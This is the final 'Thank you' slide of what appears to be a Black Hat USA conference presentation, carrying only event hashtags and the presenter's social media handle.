#BHUSA @BlackHatEvents

## Slide 154

## **Thank you**

<u>@Guluisacat</u>

#BHUSA @BlackHatEvents
